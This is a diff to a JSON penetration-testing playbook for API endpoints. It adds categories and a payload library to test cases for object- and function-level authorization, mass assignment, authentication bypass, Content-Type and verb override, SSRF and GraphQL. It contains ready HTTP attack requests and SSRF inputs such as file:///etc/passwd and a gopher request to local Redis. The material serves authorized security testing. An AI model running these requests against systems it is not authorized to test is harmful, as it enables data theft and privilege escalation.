@@ -3,9 +3,19 @@
   "id": "api-endpoint",
   "title": "API endpoint",
   "summary": "Auth on every verb, object and function authorization, mass assignment, content-type swaps, and URL-fetching fields. Two accounts minimum.",
-  "when": { "api_style": ["rest"] },
-  "also_when": { "app_type": ["api_only"] },
-  "default_for": ["api_only"],
+  "when": {
+    "api_style": [
+      "rest"
+    ]
+  },
+  "also_when": {
+    "app_type": [
+      "api_only"
+    ]
+  },
+  "default_for": [
+    "api_only"
+  ],
   "groups": [
     {
       "id": "authz",
@@ -16,7 +26,10 @@
           "id": "bola",
           "title": "Object-level authorization (BOLA)",
           "item": "WAPT-API-001",
-          "related": ["WAPT-AUTHZ-003", "WAPT-API-002"],
+          "related": [
+            "WAPT-AUTHZ-003",
+            "WAPT-API-002"
+          ],
           "severity": "high",
           "why": "The handler trusts the object id in the path or body more than the caller.",
           "validate": "Account B reads or changes account A's object. Confirm against a fresh authoritative read.",
@@ -25,25 +38,34 @@
               "name": "Swap the path id",
               "kind": "request",
               "payload": "GET /api/v1/orders/1002 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>",
-              "expect": "1002 belongs to account B. Repeat as PUT/PATCH/DELETE on the same id."
+              "expect": "1002 belongs to account B. Repeat as PUT/PATCH/DELETE on the same id.",
+              "category": "authorization-context",
+              "why": "Reading another tenant's object via its path id with your token is the canonical BOLA.",
+              "payload_ref": "bola-path"
             },
             {
               "name": "Swap in the JSON body",
               "kind": "request",
               "payload": "PATCH /api/v1/orders/1001 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"id\":1002,\"status\":\"cancelled\"}",
-              "expect": "Body id must not retarget the update. Also try user_id, account_id, tenant_id, org_id."
+              "expect": "Body id must not retarget the update. Also try user_id, account_id, tenant_id, org_id.",
+              "category": "parameter-variant",
+              "why": "The object id in the body may bind a different object than the route path, bypassing the check."
             },
             {
               "name": "Numeric walk",
               "kind": "request",
               "payload": "GET /api/v1/orders/1000 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>",
-              "expect": "1000, 1001, 1002. A 200 for another tenant is the finding. Stop after a few hits."
+              "expect": "1000, 1001, 1002. A 200 for another tenant is the finding. Stop after a few hits.",
+              "category": "authorization-context",
+              "why": "Sequential ids let one token sweep the object space."
             },
             {
               "name": "Nested and bulk",
               "kind": "request",
               "payload": "POST /api/v1/orders/export HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"ids\":[1001,1002,1003]}",
-              "expect": "Each member needs its own decision. Also /orders/1001/items/55 and /graphql node(id:)."
+              "expect": "Each member needs its own decision. Also /orders/1001/items/55 and /graphql node(id:).",
+              "category": "authorization-context",
+              "why": "Nested or batch endpoints can fetch objects the top-level endpoint authorizes individually."
             }
           ]
         },
@@ -51,7 +73,10 @@
           "id": "bfla",
           "title": "Function-level authorization (BFLA)",
           "item": "WAPT-API-020",
-          "related": ["WAPT-AUTHZ-013", "WAPT-API-021"],
+          "related": [
+            "WAPT-AUTHZ-013",
+            "WAPT-API-021"
+          ],
           "severity": "high",
           "why": "Admin routes exist in the spec, the JS bundle, or an older version, and a member token can call them.",
           "validate": "A privileged function executes for a caller the matrix denies.",
@@ -60,19 +85,25 @@
               "name": "Member token on an admin route",
               "kind": "request",
               "payload": "GET /api/v1/admin/users HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>",
-              "expect": "403/404, not a user list. Repeat /internal/, /debug/, /actuator/, /manage/."
+              "expect": "403/404, not a user list. Repeat /internal/, /debug/, /actuator/, /manage/.",
+              "category": "authorization-context",
+              "why": "A low-privilege token invoking an admin function is function-level authorization failure."
             },
             {
               "name": "Verb swap",
               "kind": "request",
               "payload": "DELETE /api/v1/users/42 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>",
-              "expect": "GET may be allowed and DELETE not. Also PUT, PATCH, OPTIONS."
+              "expect": "GET may be allowed and DELETE not. Also PUT, PATCH, OPTIONS.",
+              "category": "authorization-context",
+              "why": "The same route may authorize GET but not DELETE; swapping the verb bypasses the check."
             },
             {
               "name": "Version and alias",
               "kind": "request",
               "payload": "GET /api/v0/admin/users HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>",
-              "expect": "Older versions, /api/users vs /api/user, trailing slashes, and case variants."
+              "expect": "Older versions, /api/users vs /api/user, trailing slashes, and case variants.",
+              "category": "technology-specific",
+              "why": "An older API version or alias route may not inherit the current authorization."
             }
           ]
         },
@@ -80,7 +111,10 @@
           "id": "mass-assignment",
           "title": "Mass assignment / extra properties",
           "item": "WAPT-API-012",
-          "related": ["WAPT-API-014", "WAPT-AUTHZ-018"],
+          "related": [
+            "WAPT-API-014",
+            "WAPT-AUTHZ-018"
+          ],
           "severity": "high",
           "why": "The binder accepts role, price, owner, or verified flags the UI never sends.",
           "validate": "An unlisted property is stored and later returned or enforced.",
@@ -89,13 +123,17 @@
               "name": "Hidden privilege fields",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>\nContent-Type: application/json\n\n{\"role\":\"admin\",\"isAdmin\":true,\"verified\":true,\"price\":0}",
-              "expect": "Read the object back. role/isAdmin/verified/price/balance/tenant_id must be unchanged."
+              "expect": "Read the object back. role/isAdmin/verified/price/balance/tenant_id must be unchanged.",
+              "category": "parameter-variant",
+              "why": "Sending undeclared properties maps them to model attributes the API never intended to expose."
             },
             {
               "name": "JSON nested wrapper",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>\nContent-Type: application/json\n\n{\"user\":{\"role\":\"admin\"},\"role\":\"admin\"}",
-              "expect": "Some binders take the nested object, some the top-level key. Try both."
+              "expect": "Some binders take the nested object, some the top-level key. Try both.",
+              "category": "parameter-variant",
+              "why": "Nested wrappers can smuggle privilege fields past a flat allowlist."
             }
           ]
         }
@@ -110,7 +148,9 @@
           "id": "no-auth",
           "title": "Missing or alternate authentication",
           "item": "WAPT-API-006",
-          "related": ["WAPT-AUTH-017"],
+          "related": [
+            "WAPT-AUTH-017"
+          ],
           "severity": "high",
           "why": "The same route accepts no token, an expired token, or a token in a different place.",
           "validate": "A protected resource returns data without a current credential.",
@@ -119,19 +159,25 @@
               "name": "Drop the Authorization header",
               "kind": "request",
               "payload": "GET /api/v1/orders HTTP/1.1\nHost: api.example.com\nConnection: close",
-              "expect": "401, not 200 with data. Repeat on every interesting route, not only /me."
+              "expect": "401, not 200 with data. Repeat on every interesting route, not only /me.",
+              "category": "authentication-context",
+              "why": "A 200 with the token removed means the resource is not actually gated."
             },
             {
               "name": "Token in the query string",
               "kind": "request",
               "payload": "GET /api/v1/orders?access_token=<token> HTTP/1.1\nHost: api.example.com\nConnection: close",
-              "expect": "If it works, the token is now in logs and Referer. Prefer that it does not work."
+              "expect": "If it works, the token is now in logs and Referer. Prefer that it does not work.",
+              "category": "protocol-variant",
+              "why": "A bearer accepted from the query string leaks into logs, caches, and Referer."
             },
             {
               "name": "Expired and wrong-audience JWT",
               "kind": "note",
               "payload": "Replay a captured token after logout, after expiry, and against a sibling API on the same issuer.",
-              "expect": "Must fail. See the JWT playbook checks in the methodology for alg=none and kid tricks."
+              "expect": "Must fail. See the JWT playbook checks in the methodology for alg=none and kid tricks.",
+              "category": "authentication-context",
+              "why": "Accepted expired or wrong-audience tokens mean expiry and audience are not enforced."
             }
           ]
         },
@@ -139,7 +185,10 @@
           "id": "content-type",
           "title": "Content-Type and verb override",
           "item": "WAPT-HTTP-004",
-          "related": ["WAPT-HTTP-003", "WAPT-API-029"],
+          "related": [
+            "WAPT-HTTP-003",
+            "WAPT-API-029"
+          ],
           "severity": "medium",
           "why": "A JSON-only handler that also parses form or text/plain skips CSRF and schema checks.",
           "validate": "The same body is accepted under a different type or verb and changes state.",
@@ -148,19 +197,26 @@
               "name": "JSON as form",
               "kind": "request",
               "payload": "POST /api/v1/orders HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <token>\nContent-Type: application/x-www-form-urlencoded\n\nid=1002&status=cancelled",
-              "expect": "Rejected, or parsed and authorized the same way as JSON. A silent parse is the interesting case."
+              "expect": "Rejected, or parsed and authorized the same way as JSON. A silent parse is the interesting case.",
+              "category": "parser-differential",
+              "why": "Frameworks may parse the same body differently by Content-Type, altering which parameters are bound."
             },
             {
               "name": "JSON as text/plain (CSRF-simple)",
               "kind": "request",
               "payload": "POST /api/v1/orders HTTP/1.1\nHost: api.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\n\n{\"status\":\"cancelled\"}",
-              "expect": "Must not change state. This is the classic simple-request CSRF shape."
+              "expect": "Must not change state. This is the classic simple-request CSRF shape.",
+              "category": "browser-context",
+              "why": "A text/plain JSON POST skips a preflight and can be CSRF'd unless a token is required.",
+              "payload_ref": "csrf-simple-json"
             },
             {
               "name": "X-HTTP-Method-Override",
               "kind": "request",
               "payload": "POST /api/v1/orders/1001 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <token>\nX-HTTP-Method-Override: DELETE\nContent-Length: 0",
-              "expect": "Override must not reach a handler the real DELETE would refuse. Also try _method=DELETE."
+              "expect": "Override must not reach a handler the real DELETE would refuse. Also try _method=DELETE.",
+              "category": "header-variant",
+              "why": "A header override changes the effective verb the route authorizes."
             }
           ]
         },
@@ -168,7 +224,10 @@
           "id": "url-fetch",
           "title": "Server-side URL parameters",
           "item": "WAPT-API-027",
-          "related": ["WAPT-SSRF-001", "WAPT-SSRF-003"],
+          "related": [
+            "WAPT-SSRF-001",
+            "WAPT-SSRF-003"
+          ],
           "severity": "high",
           "why": "webhook, import, avatar, and preview fields make the server fetch a URL you choose.",
           "validate": "A callback on a host you control, or an internal destination, is fetched. Use Collaborator / a canary, never cloud metadata on a shared environment without approval.",
@@ -177,19 +236,26 @@
               "name": "Collaborator HTTPS",
               "kind": "request",
               "payload": "POST /api/v1/hooks HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <token>\nContent-Type: application/json\n\n{\"url\":\"https://unique.oast.example/wapt\"}",
-              "expect": "An outbound HTTP hit on your listener. Repeat for image, callback, feed, avatar, import_url, pdf, sitemap."
+              "expect": "An outbound HTTP hit on your listener. Repeat for image, callback, feed, avatar, import_url, pdf, sitemap.",
+              "category": "out-of-band",
+              "why": "A controlled HTTPS callback confirms the server makes the outbound request.",
+              "payload_ref": "collaborator-url"
             },
             {
               "name": "Redirect follow",
               "kind": "note",
               "payload": "Point url at https://unique.oast.example/302 which 302s to http://127.0.0.1/.",
-              "expect": "The server must not follow to loopback. Do not hit cloud metadata unless the owner approved an isolated test."
+              "expect": "The server must not follow to loopback. Do not hit cloud metadata unless the owner approved an isolated test.",
+              "category": "parser-differential",
+              "why": "A redirect-following fetcher can be steered to an internal address the first request was denied."
             },
             {
               "name": "Scheme and userinfo",
               "kind": "note",
               "payload": "file:///etc/passwd\ngopher://127.0.0.1:6379/_\nhttp://127.0.0.1#@unique.oast.example/\nhttp://unique.oast.example@127.0.0.1/",
-              "expect": "Schemes outside http/https should be refused. Parser differentials on userinfo are common."
+              "expect": "Schemes outside http/https should be refused. Parser differentials on userinfo are common.",
+              "category": "encoding",
+              "why": "Scheme/userinfo tricks in the URL are parsed differently by the SSRF guard and the actual client."
             }
           ]
         }
@@ -204,7 +270,9 @@
           "id": "gql-introspect",
           "title": "Introspection and suggestions",
           "item": "WAPT-GQL-002",
-          "related": ["WAPT-GQL-001"],
+          "related": [
+            "WAPT-GQL-001"
+          ],
           "severity": "medium",
           "why": "Production introspection or field suggestions disclose the schema the client never ships.",
           "validate": "__schema or a typo suggestion returns fields the public contract does not list.",
@@ -213,13 +281,17 @@
               "name": "Classic introspection",
               "kind": "request",
               "payload": "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"{__schema{types{name fields{name}}}}\"}",
-              "expect": "Disabled in production, or limited to an allowlisted consumer. A full dump is a lead plus any hidden mutations."
+              "expect": "Disabled in production, or limited to an allowlisted consumer. A full dump is a lead plus any hidden mutations.",
+              "category": "baseline",
+              "why": "Introspection reveals the schema; disabling it is the expected production posture."
             },
             {
               "name": "Field suggestion",
               "kind": "request",
               "payload": "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"{user{emial}}\"}",
-              "expect": "\"Did you mean email?\" confirms names even when introspection is off."
+              "expect": "\"Did you mean email?\" confirms names even when introspection is off.",
+              "category": "technology-specific",
+              "why": "GraphQL suggestions disclose field names even when introspection is blocked."
             }
           ]
         },
@@ -227,7 +299,10 @@
           "id": "gql-authz",
           "title": "GraphQL object and field authorization",
           "item": "WAPT-GQL-004",
-          "related": ["WAPT-GQL-005", "WAPT-GQL-006"],
+          "related": [
+            "WAPT-GQL-005",
+            "WAPT-GQL-006"
+          ],
           "severity": "high",
           "why": "node(id:), aliases, and nested edges skip the authorization the REST path has.",
           "validate": "A field or node belonging to another account is returned.",
@@ -236,17 +311,50 @@
               "name": "node(id:) swap",
               "kind": "request",
               "payload": "POST /graphql HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"query\":\"{node(id:\\\"T3JkZXI6MTAwMg==\\\"){... on Order{id total}}}\"}",
-              "expect": "Order 1002 is B's. Decode and recode other type prefixes too."
+              "expect": "Order 1002 is B's. Decode and recode other type prefixes too.",
+              "category": "authorization-context",
+              "why": "Reading another object by global id is object-level authorization failure."
             },
             {
               "name": "Hidden field selection",
               "kind": "request",
               "payload": "POST /graphql HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <member-token>\nContent-Type: application/json\n\n{\"query\":\"{me{id email role passwordHash ssn}}\"}",
-              "expect": "role, hashes, and internal fields must be absent or unauthorized — not merely omitted by the default client query."
+              "expect": "role, hashes, and internal fields must be absent or unauthorized — not merely omitted by the default client query.",
+              "category": "authorization-context",
+              "why": "Fields with per-field authorization can leak data via a query that selects them directly."
             }
           ]
         }
       ]
     }
-  ]
+  ],
+  "payloads": {
+    "bola-path": {
+      "id": "bola-path",
+      "category": "authorization-context",
+      "context": "Object id in path",
+      "encoding": "none",
+      "purpose": "Reading another tenant's object via its path id with your token is the canonical BOLA.",
+      "safe": true,
+      "payload": "GET /api/v1/orders/1002 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <account-A-token>"
+    },
+    "csrf-simple-json": {
+      "id": "csrf-simple-json",
+      "category": "browser-context",
+      "context": "Content-Type header",
+      "encoding": "none",
+      "purpose": "A text/plain JSON POST skips a preflight and can be CSRF'd unless a token is required.",
+      "safe": true,
+      "payload": "POST /api/v1/orders HTTP/1.1\nHost: api.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\n\n{\"status\":\"cancelled\"}"
+    },
+    "collaborator-url": {
+      "id": "collaborator-url",
+      "category": "out-of-band",
+      "context": "Server-side URL parameter",
+      "encoding": "none",
+      "purpose": "A controlled HTTPS callback confirms the server makes the outbound request.",
+      "safe": true,
+      "payload": "POST /api/v1/hooks HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <token>\nContent-Type: application/json\n\n{\"url\":\"https://unique.oast.example/wapt\"}"
+    }
+  }
 }
